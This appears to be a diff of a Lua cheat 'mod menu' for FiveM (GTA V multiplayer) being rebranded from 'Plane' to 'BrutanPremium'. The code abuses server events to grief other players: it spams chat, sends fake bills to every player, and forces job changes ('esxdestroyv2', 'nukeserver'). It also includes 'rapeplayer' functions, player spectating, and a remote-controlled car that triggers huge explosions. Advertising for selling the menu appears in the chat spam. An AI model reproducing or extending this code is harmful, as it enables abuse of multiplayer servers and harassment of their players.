+  ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57, 
+  ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177, 
+  ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
+  ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
+  ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
+  ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70, 
+  ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
+  ["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
+  ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118
+}
 local keys = { up = 172, down = 173, left = 174, right = 175, select = 215, back = 194 }
 local optionCount = 0
 
@@ -1350,7 +2061,7 @@ function math.round(num, numDecimalPlaces)
     return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
 end
 
-local function RGBRainbow(frequency)
+local function RGBou328h(frequency)
     local result = {}
     local curtime = GetGameTimer() / 1000
 
@@ -1437,7 +2148,7 @@ local allWeapons = {
 }
 
 local function debugPrint(text)
-    if Plane.debug then
+    if BrutanPremium.debug then
         Citizen.Trace("[Plane] "..tostring(text))
     end
 end
@@ -1450,6 +2161,9 @@ local function setMenuProperty(id, property, value)
     end
 end
 
+    function BrutanPremium.SetSpriteColor(id, r, g, b, a)
+        setMenuProperty(id, 'spriteColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a })
+    end
 
 local function isMenuVisible(id)
     if id and menus[id] then
@@ -1705,7 +2419,7 @@ local function drawSubTitle()
         local x = menus[currentMenu].x + menus[currentMenu].width / 2
         local y = menus[currentMenu].y + titleHeight + buttonHeight / 2
 
-        local subTitleColor = { r = menus[currentMenu].titleBackgroundColor.r, g = menus[currentMenu].titleBackgroundColor.g, b = menus[currentMenu].titleBackgroundColor.b, a = 255 }
+        local subTitleColor = { r = 255, g = 255, b = 255, a = 0 }
 
         drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
         drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false)
@@ -1755,8 +2469,7 @@ local function drawButton(text, subText)
 end
 
 
-function Plane.CreateMenu(id, title)
-    -- Default settings
+function BrutanPremium.CreateMenu(id, title)
     menus[id] = { }
     menus[id].title = title
 
@@ -1766,35 +2479,35 @@ function Plane.CreateMenu(id, title)
 
     menus[id].aboutToBeClosed = false
 
-    menus[id].x = 0.725
-    menus[id].y = 0.2
+    menus[id].x = 0.75
+    menus[id].y = 0.1
     menus[id].width = 0.225
 
     menus[id].currentOption = 1
-    menus[id].maxOptionCount = 10
+    menus[id].maxOptionCount = 13
 
     menus[id].titleFont = 1
     menus[id].titleColor = { r = 255, g = 255, b = 255, a = 255 }
     menus[id].titleBackgroundColor = { r = 0, g = 0, b = 0, a = 180 }
     menus[id].titleBackgroundSprite = nil
 
-    menus[id].menuTextColor = { r = 255, g = 255, b = 255, a = 255 }
+    menus[id].menuTextColor = { r = 0, g = 0, b = 0, a = 255 }
     menus[id].menuSubTextColor = { r = 255, g = 255, b = 255, a = 255 }
-    menus[id].menuFocusTextColor = { r = 0, g = 255, b = 255, a = 255 }
-    menus[id].menuFocusBackgroundColor = { r = 60, g = 60, b = 60, a = 180 }
-    menus[id].menuBackgroundColor = { r = 0, g = 0, b = 0, a = 160 }
+    menus[id].menuFocusTextColor = { r = 0, g = 0, b = 0, a = 255 }
+    menus[id].menuFocusBackgroundColor = { r = 255, g = 255, b = 255, a = 180 }
+    menus[id].menuBackgroundColor = { r = 5, g = 160, b = 1, a = 125 }
 
     menus[id].subTitleBackgroundColor = { r = 0, g = 0, b = 0, a = 180 }
 
-    menus[id].buttonPressedSound = { name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET" } --https://pastebin.com/0neZdsZ5
+    menus[id].buttonPressedSound = { name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET" }
 
     debugPrint(tostring(id).." menu created")
 end
 
 
-function Plane.CreateSubMenu(id, parent, subTitle)
+function BrutanPremium.CreateSubMenu(id, parent, subTitle)
     if menus[parent] then
-        Plane.CreateMenu(id, menus[parent].title)
+        BrutanPremium.CreateMenu(id, menus[parent].title)
 
         if subTitle then
             setMenuProperty(id, "subTitle", string.upper(subTitle))
@@ -1823,12 +2536,12 @@ function Plane.CreateSubMenu(id, parent, subTitle)
 end
 
 
-function Plane.CurrentMenu()
+function BrutanPremium.CurrentMenu()
     return currentMenu
 end
 
 
-function Plane.OpenMenu(id)
+function trynaskidhuh(id)
     if id and menus[id] then
         PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
         setMenuVisible(id, true)
@@ -1839,12 +2552,12 @@ function Plane.OpenMenu(id)
 end
 
 
-function Plane.IsMenuOpened(id)
+function BrutanPremium.IsMenuOpened(id)
     return isMenuVisible(id)
 end
 
 
-function Plane.IsAnyMenuOpened()
+function BrutanPremium.IsAnyMenuOpened()
     for id, _ in pairs(menus) do
         if isMenuVisible(id) then return true end
     end
@@ -1853,7 +2566,7 @@ function Plane.IsAnyMenuOpened()
 end
 
 
-function Plane.IsMenuAboutToBeClosed()
+function BrutanPremium.IsMenuAboutToBeClosed()
     if menus[currentMenu] then
         return menus[currentMenu].aboutToBeClosed
     else
@@ -1862,7 +2575,7 @@ function Plane.IsMenuAboutToBeClosed()
 end
 
 
-function Plane.CloseMenu()
+function BrutanPremium.CloseMenu()
     if menus[currentMenu] then
         if menus[currentMenu].aboutToBeClosed then
             menus[currentMenu].aboutToBeClosed = false
@@ -1880,7 +2593,7 @@ function Plane.CloseMenu()
 end
 
 
-function Plane.Button(text, subText)
+function BrutanPremium.Button(text, subText)
     local buttonText = text
     if subText then
         buttonText = "{ "..tostring(buttonText)..", "..tostring(subText).." }"
@@ -1912,9 +2625,9 @@ function Plane.Button(text, subText)
 end
 
 
-function Plane.MenuButton(text, id)
+function BrutanPremium.MenuButton(text, id)
     if menus[id] then
-        if Plane.Button(text) then
+        if BrutanPremium.Button(text) then
             setMenuVisible(currentMenu, false)
             setMenuVisible(id, true, true)
 
@@ -1950,8 +2663,8 @@ local bm = {
     }
 }
 
-function Plane.CheckBox(text, checked, callback)
-    if Plane.Button(text, checked and "~w~~h~On" or "~h~~c~Off") then
+function BrutanPremium.CheckBox(text, checked, callback)
+    if BrutanPremium.Button(text, checked and "~g~~h~On" or "~h~~c~Off") then
         checked = not checked
         debugPrint(tostring(text).." checkbox changed to "..tostring(checked))
         if callback then callback(checked) end
@@ -1963,7 +2676,7 @@ function Plane.CheckBox(text, checked, callback)
 end
 
 
-function Plane.ComboBox(text, items, currentIndex, selectedIndex, callback)
+function BrutanPremium.ComboBox(text, items, currentIndex, selectedIndex, callback)
     local itemsCount = #items
     local selectedItem = items[currentIndex]
     local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)
@@ -1972,7 +2685,7 @@ function Plane.ComboBox(text, items, currentIndex, selectedIndex, callback)
         selectedItem = "← "..tostring(selectedItem).." →"
     end
 
-    if Plane.Button(text, selectedItem) then
+    if BrutanPremium.Button(text, selectedItem) then
         selectedIndex = currentIndex
         callback(currentIndex, selectedIndex)
         return true
@@ -1990,10 +2703,10 @@ function Plane.ComboBox(text, items, currentIndex, selectedIndex, callback)
     return false
 end
 
-function Plane.Display()
+function BrutanPremium.Display()
     if isMenuVisible(currentMenu) then
         if menus[currentMenu].aboutToBeClosed then
-            Plane.CloseMenu()
+            BrutanPremium.CloseMenu()
         else
             ClearAllHelpMessages()
 
@@ -2029,7 +2742,7 @@ function Plane.Display()
                     PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                     setMenuVisible(menus[currentMenu].previousMenu, true)
                 else
-                    Plane.CloseMenu()
+                    BrutanPremium.CloseMenu()
                 end
             end
 
@@ -2039,71 +2752,71 @@ function Plane.Display()
 end
 
 
-function Plane.SetMenuWidth(id, width)
+function BrutanPremium.SetMenuWidth(id, width)
     setMenuProperty(id, "width", width)
 end
 
 
-function Plane.SetMenuX(id, x)
+function BrutanPremium.SetMenuX(id, x)
     setMenuProperty(id, "x", x)
 end
 
 
-function Plane.SetMenuY(id, y)
+function BrutanPremium.SetMenuY(id, y)
     setMenuProperty(id, "y", y)
 end
 
 
-function Plane.SetMenuMaxOptionCountOnScreen(id, count)
+function BrutanPremium.SetMenuMaxOptionCountOnScreen(id, count)
     setMenuProperty(id, "maxOptionCount", count)
 end
 
 
-function Plane.SetTitle(id, title)
+function BrutanPremium.SetTitle(id, title)
     setMenuProperty(id, "title", title)
 end
 
 
-function Plane.SetTitleColor(id, r, g, b, a)
+function BrutanPremium.SetTitleColor(id, r, g, b, a)
     setMenuProperty(id, "titleColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a })
 end
 
 
-function Plane.SetTitleBackgroundColor(id, r, g, b, a)
+function BrutanPremium.SetTitleBackgroundColor(id, r, g, b, a)
     setMenuProperty(id, "titleBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a })
 end
 
 
-function Plane.SetTitleBackgroundSprite(id, textureDict, textureName)
+function BrutanPremium.SetTitleBackgroundSprite(id, textureDict, textureName)
     RequestStreamedTextureDict(textureDict)
     setMenuProperty(id, "titleBackgroundSprite", { dict = textureDict, name = textureName })
 end
 
 
-function Plane.SetSubTitle(id, text)
+function BrutanPremium.SetSubTitle(id, text)
     setMenuProperty(id, "subTitle", string.upper(text))
 end
 
 
-function Plane.SetMenuBackgroundColor(id, r, g, b, a)
+function BrutanPremium.SetMenuBackgroundColor(id, r, g, b, a)
     setMenuProperty(id, "menuBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a })
 end
 
 
-function Plane.SetMenuTextColor(id, r, g, b, a)
+function BrutanPremium.SetMenuTextColor(id, r, g, b, a)
     setMenuProperty(id, "menuTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a })
 end
 
-function Plane.SetMenuSubTextColor(id, r, g, b, a)
+function BrutanPremium.SetMenuSubTextColor(id, r, g, b, a)
     setMenuProperty(id, "menuSubTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a })
 end
 
-function Plane.SetMenuFocusColor(id, r, g, b, a)
+function BrutanPremium.SetMenuFocusColor(id, r, g, b, a)
     setMenuProperty(id, "menuFocusColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a })
 end
 
 
-function Plane.SetMenuButtonPressedSound(id, name, set)
+function BrutanPremium.SetMenuButtonPressedSound(id, name, set)
     setMenuProperty(id, "buttonPressedSound", { ["name"] = name, ["set"] = set })
 end
 
@@ -2113,12 +2826,13 @@ function drawNotification(text)
     DrawNotification(false, false)
 end
 
+
 function getEntity(player)
     local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
     return entity
 end
 
-local function bf(u,kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl)
+local function bf(u,kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl)
     SetTextFont(0)
     SetTextProportional(1)
     SetTextScale(0.0,0.4)
@@ -2128,7 +2842,7 @@ local function bf(u,kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXB
     SetTextOutline()
     SetTextEntry("STRING")
     AddTextComponentString(u)
-    DrawText(kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl)
+    DrawText(kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl)
  end
 
  local bn = {
@@ -2153,64 +2867,7 @@ local function bf(u,kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXB
         id = 5
     }
 }
-local bo = {
-    {
-        name = "~h~Default",
-        id = -1
-    },
-    {
-        name = "~h~White",
-        id = 0
-    },
-    {
-        name = "~h~Blue",
-        id = 1
-    },
-    {
-        name = "~h~Electric Blue",
-        id = 2
-    },
-    {
-        name = "~h~Mint Green",
-        id = 3
-    },
-    {
-        name = "~h~Lime Green",
-        id = 4
-    },
-    {
-        name = "~h~Yellow",
-        id = 5
-    },
-    {
-        name = "~h~Golden Shower",
-        id = 6
-    },
-    {
-        name = "~h~Orange",
-        id = 7
-    },
-    {
-        name = "~h~Red",
-        id = 8
-    },
-    {
-        name = "~h~Pony Pink",
-        id = 9
-    },
-    {
-        name = "~h~Hot Pink",
-        id = 10
-    },
-    {
-        name = "~h~Purple",
-        id = 11
-    },
-    {
-        name = "~h~Blacklight",
-        id = 12
-    }
-}
+
 local bp = {
     ["Stock Horn"] = -1,
     ["Truck Horn"] = 1,
@@ -2311,6 +2968,8 @@ local bq = {
         153
     }
 }
+
+
 local br = {
     {
         name = "~h~Black",
@@ -2823,13 +3482,13 @@ function esxdestroyv2()
                         for bD = 0, 9 do
                             TriggerServerEvent(
                                 '_chat:messageEntered',
-                                'Brutan#3927 BRUTAN',
+                                '~g~Brutan#7799',
                                 {
                                     141,
                                     211,
                                     255
                                 },
-                                '^' .. bD .. 'https://discordapp.com/invite/tCEajtn'
+                                '^' .. bD .. '~b~Brutan#7799'
                             )
                         end
                         for i = 0, 256 do
@@ -2851,7 +3510,7 @@ function esxdestroyv2()
                                 'esx_billing:sendBill',
                                 GetPlayerServerId(i),
                                 'Purposeless',
-                                'Brutan#3927 BRUTAN https://discordapp.com/invite/tCEajtn',
+                                '~g~Add me for more menus Brutan#7799',
                                 43161337
                             )
                             TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), 'police', 3)
@@ -2901,9 +3560,335 @@ function DrawText3D(x, y, z, text, r, g, b)
     ClearDrawOrigin()
 end
 
+local RCCar = {}
+
+-- BrutanPremium
+
+RCCar.Start = function()
+	if DoesEntityExist(RCCar.Entity) then return end
+
+	RCCar.Spawn()
+
+	RCCar.Tablet(true)
+
+	while DoesEntityExist(RCCar.Entity) and DoesEntityExist(RCCar.Driver) do
+		Citizen.Wait(5)
+
+		local distanceCheck = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),  GetEntityCoords(RCCar.Entity), true)
+
+		RCCar.DrawInstructions(distanceCheck)
+		RCCar.HandleKeys(distanceCheck)
+
+		if distanceCheck <= 10000000.0 then
+			if not NetworkHasControlOfEntity(RCCar.Driver) then
+				NetworkRequestControlOfEntity(RCCar.Driver)
+			elseif not NetworkHasControlOfEntity(RCCar.Entity) then
+				NetworkRequestControlOfEntity(RCCar.Entity)
+			end
+		else
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500)
+		end
+	end
+end
+
+RCCar.HandleKeys = function(distanceCheck)
+	if IsControlJustReleased(0, 47) then
+		if IsCamRendering(RCCar.Camera) then
+			RCCar.ToggleCamera(false)
+		else
+			RCCar.ToggleCamera(true)
+		end
+	end
+
+	if distanceCheck <= 10000000.0 then
+		if IsControlJustPressed(0, 73) then
+			RCCar.Attach("pick")
+		end
+	end
+
+	if distanceCheck < 10000000.0 then
+	    if IsControlJustReleased(0, 108) then
+		    local coos = GetEntityCoords(RCCar.Entity, true)
+            AddExplosion(coos.x, coos.y, coos.z, 2, 100000.0, true, false, 0)
+		end
+		if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 9, 1)
+		end
+		
+		if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500)
+		end
+
+		if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 22, 1)
+		end
+
+		if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 13, 1)
+		end
+
+		if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 14, 1)
+		end
+
+		if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 30, 100)
+		end
+
+		if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 7, 1)
+		end
+
+		if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 8, 1)
+		end
+
+		if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 4, 1)
+		end
+
+		if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
+			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 5, 1)
+		end
+	end
+end
+
+RCCar.DrawInstructions = function(distanceCheck)
+	local steeringButtons = {
+		{
+			["label"] = "Right",
+			["button"] = "~INPUT_CELLPHONE_RIGHT~"
+		},
+		{
+			["label"] = "Forward",
+			["button"] = "~INPUT_CELLPHONE_UP~"
+		},
+		{
+			["label"] = "Reverse",
+			["button"] = "~INPUT_CELLPHONE_DOWN~"
+		},
+		{
+			["label"] = "Left",
+			["button"] = "~INPUT_CELLPHONE_LEFT~"
+		}
+	}
+
+	local pickupButton = {
+		["label"] = "Delete",
+		["button"] = "~INPUT_VEH_DUCK~"
+	}
+	
+	local explodeButton = {
+		["label"] = "Explode",
+		["button"] = "~INPUT_VEH_FLY_ROLL_LEFT_ONLY~"
+	}
+
+	local buttonsToDraw = {
+		{
+			["label"] = "Toggle Camera",
+			["button"] = "~INPUT_DETONATE~"
+		}
+	}
+
+	if distanceCheck <= 10000000.0 then
+		for buttonIndex = 1, #steeringButtons do
+			local steeringButton = steeringButtons[buttonIndex]
+
+			table.insert(buttonsToDraw, steeringButton)
+		end
+
+		if distanceCheck <= 1000000.0 then
+			table.insert(buttonsToDraw, explodeButton)
+		end
+		
+		if distanceCheck <= 1000000.0 then
+			table.insert(buttonsToDraw, pickupButton)
+		end
+	end
+
+    Citizen.CreateThread(function()
+        local instructionScaleform = RequestScaleformMovie("instructional_buttons")
+
+        while not HasScaleformMovieLoaded(instructionScaleform) do
+            Wait(0)
+        end
+
+        PushScaleformMovieFunction(instructionScaleform, "CLEAR_ALL")
+        PushScaleformMovieFunction(instructionScaleform, "TOGGLE_MOUSE_BUTTONS")
+        PushScaleformMovieFunctionParameterBool(0)
+        PopScaleformMovieFunctionVoid()
+
+        for buttonIndex, buttonValues in ipairs(buttonsToDraw) do
+            PushScaleformMovieFunction(instructionScaleform, "SET_DATA_SLOT")
+            PushScaleformMovieFunctionParameterInt(buttonIndex - 1)
+
+            PushScaleformMovieMethodParameterButtonName(buttonValues["button"])
+            PushScaleformMovieFunctionParameterString(buttonValues["label"])
+            PopScaleformMovieFunctionVoid()
+        end
+
+        PushScaleformMovieFunction(instructionScaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
+        PushScaleformMovieFunctionParameterInt(-1)
+        PopScaleformMovieFunctionVoid()
+        DrawScaleformMovieFullscreen(instructionScaleform, 255, 255, 255, 255)
+    end)
+end
+
+-- 4x482
+
+RCCar.Spawn = function()
+	RCCar.LoadModels({ GetHashKey(RCCAR123), 68070371 })
+
+	local spawnCoords, spawnHeading = GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0, GetEntityHeading(PlayerPedId())
+
+	RCCar.Entity = CreateVehicle(GetHashKey(RCCAR123), spawnCoords, spawnHeading, true)
+
+	while not DoesEntityExist(RCCar.Entity) do
+		Citizen.Wait(5)
+	end
+
+	RCCar.Driver = CreatePed(5, 68070371, spawnCoords, spawnHeading, true)
+
+	SetEntityInvincible(RCCar.Driver, true)
+	SetEntityVisible(RCCar.Driver, false)
+	FreezeEntityPosition(RCCar.Driver, true)
+	SetPedAlertness(RCCar.Driver, 0.0)
+    SetVehicleNumberPlateText(RCCar.Entity, "Brutan#7799")
+	TaskWarpPedIntoVehicle(RCCar.Driver, RCCar.Entity, -1)
+   
+
+	while not IsPedInVehicle(RCCar.Driver, RCCar.Entity) do
+		Citizen.Wait(0)
+	end
+
+	RCCar.Attach("place")
+end
+
+RCCar.Attach = function(param)
+	if not DoesEntityExist(RCCar.Entity) then
+		return
+	end
+	
+	RCCar.LoadModels({ "pickup_object" })
+
+	if param == "place" then
+
+		PlaceObjectOnGroundProperly(RCCar.Entity)
+	elseif param == "pick" then
+		if DoesCamExist(RCCar.Camera) then
+			RCCar.ToggleCamera(false)
+		end
+
+		RCCar.Tablet(false)
+
+		DeleteVehicle(RCCar.Entity)
+		DeleteEntity(RCCar.Driver)
+
+		RCCar.UnloadModels()
+	end
+end
+
+RCCar.Tablet = function(boolean)
+	if boolean then
+
+
+
+	
+		Citizen.CreateThread(function()
+			while DoesEntityExist(RCCar.TabletEntity) do
+				Citizen.Wait(5)
+	
+
+			end
+
+			ClearPedTasks(PlayerPedId())
+		end)
+	else
+		DeleteEntity(RCCar.TabletEntity)
+	end
+end
+
+ConfigCamera = true
+
+RCCar.ToggleCamera = function(boolean)
+	if not ConfigCamera then return end
+
+	if boolean then
+		if not DoesEntityExist(RCCar.Entity) then return end 
+		if DoesCamExist(RCCar.Camera) then DestroyCam(RCCar.Camera) end
+
+		RCCar.Camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
+
+		AttachCamToEntity(RCCar.Camera, RCCar.Entity, 0.0, 0.0, 0.4, true)
+
+		Citizen.CreateThread(function()
+			while DoesCamExist(RCCar.Camera) do
+				Citizen.Wait(5)
+
+				SetCamRot(RCCar.Camera, GetEntityRotation(RCCar.Entity))
+			end
+		end)
+
+		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), true) / 10)
+
+		RenderScriptCams(1, 1, easeTime, 1, 1)
+
+		Citizen.Wait(easeTime)
+
+	else
+		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), true) / 10)
+
+		RenderScriptCams(0, 1, easeTime, 1, 0)
+
+		Citizen.Wait(easeTime)
+
+		ClearTimecycleModifier()
+
+		DestroyCam(RCCar.Camera)
+	end
+end
+
+RCCar.LoadModels = function(models)
+	for modelIndex = 1, #models do
+		local model = models[modelIndex]
+
+		if not RCCar.CachedModels then
+			RCCar.CachedModels = {}
+		end
+
+		table.insert(RCCar.CachedModels, model)
+
+		if IsModelValid(model) then
+			while not HasModelLoaded(model) do
+				RequestModel(model)
+	
+				Citizen.Wait(10)
+			end
+		else
+			while not HasAnimDictLoaded(model) do
+				RequestAnimDict(model)
+	
+				Citizen.Wait(10)
+			end    
+		end
+	end
+end
+
+RCCar.UnloadModels = function()
+	for modelIndex = 1, #RCCar.CachedModels do
+		local model = RCCar.CachedModels[modelIndex]
+
+		if IsModelValid(model) then
+			SetModelAsNoLongerNeeded(model)
+		else
+			RemoveAnimDict(model)   
+		end
+	end
+end
+
 function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
-    AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
-    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
+    AddTextEntry("FMMC_KEY_TIP9N", TextEntry .. ":")
+    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP9N", "", ExampleText, "", "", "", MaxStringLength)
     blockinput = true
 
     while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
@@ -2954,7 +3939,7 @@ function TeleportToCoords()
             SetEntityCoords(entity, x + 0.5, y + 0.5, z + 0.5, 1,0,0,1)
         end
     else
-        drawNotification("~g~Invalid Coords!")
+        drawNotification("~r~Invalid Coordinates, are you fucking stupid?")
     end
 end
 
@@ -2962,7 +3947,7 @@ function TeleportToWaypoint()
     if DoesBlipExist(GetFirstBlipInfoId(8)) then
         local blipIterator = GetBlipInfoIdIterator(8)
         local blip = GetFirstBlipInfoId(8, blipIterator)
-        WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) --Thanks To Briglair [forum.FiveM.net]
+        WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) 
         wp = true
 
 
@@ -3001,7 +3986,7 @@ function TeleportToWaypoint()
             end
         end
     else
-        drawNotification("~r~No waypoint!")
+        drawNotification("~r~You have no waypoint?!")
     end
 end
 
@@ -3067,6 +4052,24 @@ function rapeplayer()
             end
         end
     )
+end
+
+function CreateDeer()
+	local Model = GetHashKey("a_c_deer")
+	RequestModel(Model)
+	while not HasModelLoaded(Model) do
+		Citizen.Wait(50)
+	end
+
+	local Ped = PlayerPedId()
+	local PedPosition = GetEntityCoords(Ped, false)
+
+	Handle = CreatePed(28, Model, PedPosition.x+1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)
+
+	SetPedCanRagdoll(Handle, Animal.Ragdoll)
+	SetEntityInvincible(Handle, Animal.Invincible)
+    SetPedDefaultComponentVariation(Handle)
+	SetModelAsNoLongerNeeded(Model)
 end
 
 function RapeAllFunc()
@@ -3187,30 +4190,6 @@ function teleportToNearestVehicle()
     end
 
 
-    -- Discord presenece
-    Citizen.CreateThread(function()
-        while discordPresence do
-            --This is the Application ID (Replace this with you own)
-            SetDiscordAppId(615150377309831179)
-
-            --Here you will have to put the image name for the "large" icon.
-            SetDiscordRichPresenceAsset("logo_name")
-
-            --(11-11-2018) New Natives:
-
-            --Here you can add hover text for the "large" icon.
-            SetDiscordRichPresenceAssetText("This is a lage icon with text")
-
-            --Here you will have to put the image name for the "small" icon.
-            SetDiscordRichPresenceAssetSmall("logo_name")
-
-            --Here you can add hover text for the "small" icon.
-            SetDiscordRichPresenceAssetSmallText("This is a lsmall icon with text")
-
-            --It updates every one minute just in case.
-            Citizen.Wait(2000)
-        end
-    end)
 
 	local function d(e)
     local f = {}
@@ -3231,7 +4210,7 @@ Citizen.CreateThread(
             Wait(1)
             for f = 0, 128 do
                 if NetworkIsPlayerActive(f) and GetPlayerPed(f) ~= GetPlayerPed(-1) then
-                    ped = GetPlayerPed(f)
+                   local ped = GetPlayerPed(f)
                     blip = GetBlipFromEntity(ped)
                     x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                     x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(f), true))
@@ -3403,7 +4382,7 @@ function nukeserver()
         end
 
         for bs=0,9 do
-            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"BRUTAN; Brutan#3927")
+            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"Brutan Premium")
         end
 
         for i=0,128 do
@@ -3456,7 +4435,6 @@ function getCamDirection()
   local y = math.cos(heading*math.pi/180.0)
   local z = math.sin(pitch*math.pi/180.0)
 
-  -- normalize
   local len = math.sqrt(x*x+y*y+z*z)
   if len ~= 0 then
     x = x/len
@@ -3498,14 +4476,14 @@ function SpectatePlayer(player)
         RequestCollisionAtCoord(targetx, targety, targetz)
         NetworkSetInSpectatorMode(true, targetPed)
 
-        drawNotification("Spectating " .. GetPlayerName(player))
+        drawNotification("~r~Spectating " .. GetPlayerName(player))
     else
         local targetx, targety, targetz = table.unpack(GetEntityCoords(targetPed, false))
 
         RequestCollisionAtCoord(targetx, targety, targetz)
         NetworkSetInSpectatorMode(false, targetPed)
 
-        drawNotification("Stopped Spectating " .. GetPlayerName(player))
+        drawNotification("~r~Stopped Spectating " .. GetPlayerName(player))
     end
 end
 
@@ -3528,19 +4506,21 @@ Citizen.CreateThread(
 			if chatspam then
                 TriggerServerEvent(
                     '_chat:messageEntered',
-                    'Brutan#3927',
+                    'Brutan#7799',
                     {0, 0x99, 255},
-                    '/ooc BRUTAN Menu! Buy at https://discordapp.com/invite/tCEajtn'
